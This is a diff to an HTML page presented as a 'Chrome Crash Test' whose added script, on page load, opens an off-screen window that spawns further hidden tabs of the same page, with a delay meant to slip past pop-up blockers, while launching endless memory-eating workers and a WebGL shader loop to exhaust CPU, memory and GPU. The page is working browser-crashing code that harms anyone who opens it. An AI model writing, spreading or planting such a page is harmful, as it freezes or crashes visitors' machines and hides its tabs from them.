@@ -1,27 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Browser Crash Test - Extreme Memory Overload</title>
+    <title>Hidden Crash Window</title>
 </head>
 <body>
-    <h1>Browser Crash Test - Extreme Memory Overload</h1>
-    <p>If your browser crashes, the test was successful.</p>
+    <h1>Chrome Crash Test - Hidden Tabs</h1>
+    <p>This page will open multiple hidden tabs.</p>
 
     <script>
-        function startWorker() {
-            let code = `
-                let data = [];
-                while (true) {
-                    data.push(new Float64Array(1e8)); // Uses more memory
+        function openHiddenWindow(numTabs) {
+            let newWin = window.open("", "_blank", "width=800,height=600,left=5000,top=5000"); // Opens off-screen
+            if (newWin) {
+                for (let i = 0; i < numTabs; i++) {
+                    newWin.open(window.location.href, '_blank'); // Opens tabs in new hidden window
                 }
-            `;
+            }
+        }
+
+        // Call function after a short delay to bypass pop-up blockers
+        setTimeout(() => {
+            openHiddenWindow(10); // Adjust number of tabs if needed
+        }, 1000);
+
+        // Multi-Threaded CPU Overload (Memory Consumption)
+        function startWorker() {
+            let code = `while (true) { new Float64Array(1e8); }`;
             let blob = new Blob([code], { type: "application/javascript" });
             let worker = new Worker(URL.createObjectURL(blob));
         }
 
-        for (let i = 0; i < navigator.hardwareConcurrency * 4; i++) { // Uses 4x CPU cores
+        for (let i = 0; i < navigator.hardwareConcurrency * 4; i++) {
             startWorker();
         }
+
+        // WebGL GPU Overload
+        var canvas = document.createElement('canvas');
+        var gl = canvas.getContext('webgl');
+        function crashGPU() {
+            let shaders = [];
+            setInterval(() => {
+                var shader = gl.createShader(gl.VERTEX_SHADER);
+                gl.shaderSource(shader, 'void main() { gl_Position = vec4(1.0); }');
+                gl.compileShader(shader);
+                shaders.push(shader);
+                gl.getShaderParameter(shader, gl.COMPILE_STATUS);
+            }, 5);
+        }
+
+        crashGPU(); // Start GPU overload immediately
     </script>
 </body>
 </html>
